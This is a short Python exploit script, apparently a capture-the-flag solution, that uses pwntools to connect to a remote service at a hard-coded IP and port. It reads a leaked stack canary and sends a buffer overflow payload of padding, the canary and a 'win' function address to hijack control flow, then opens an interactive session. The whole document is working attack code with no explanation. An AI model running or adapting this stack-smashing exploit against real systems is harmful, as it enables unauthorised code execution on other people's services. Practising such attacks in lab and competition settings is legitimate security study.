from pwn import *

context.log_level="debug"

p = remote("165.22.52.41", 1339)

p.recvuntil("\nStack Canary\t\t: ")

addr = p64(int(p.recvuntil("\n"),16))
p.sendline(b"Y")

win = p64(int(b"0x400bea",16))

p.sendline(b"A"*24 + addr + b"A"*8 + win)
p.sendline(b"N")

p.interactive()
